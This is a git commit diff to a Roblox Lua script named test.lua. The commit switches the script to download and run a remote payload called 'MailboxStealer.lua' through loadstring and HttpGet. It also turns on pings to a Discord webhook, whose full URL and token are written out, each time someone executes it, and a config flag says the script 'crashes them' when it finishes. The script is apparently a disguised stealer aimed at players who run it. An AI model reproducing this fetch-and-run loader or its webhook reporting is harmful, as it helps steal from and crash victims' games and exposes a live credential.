2a217b736edb81886baad7a4c014d07982a945f5
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-08 14:05:27 +0200

    Update test.lua

--- test.lua
+++ test.lua
@@ -8,8 +8,8 @@ _G.Crash = true  --// Crashes Them After Its Finished
 
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
-_G.Mention = false --// Pings You When Someone Executes
-_G.Webhook = "" --// Discord Webhook For Executions
+_G.Mention = true --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S" --// Discord Webhook For Executions
 
 --[[ UI Config ]]--
 _G.ScriptName = "ez" --// Script Name On The UI
@@ -19,4 +19,4 @@ _G.Tip3 = "ez" --// Gives You Tips On The UI
 _G.Tip4 = "ez" --// Gives You Tips On The UI
 _G.Tip5 = "ez" --// Gives You Tips On The UI
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/test.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
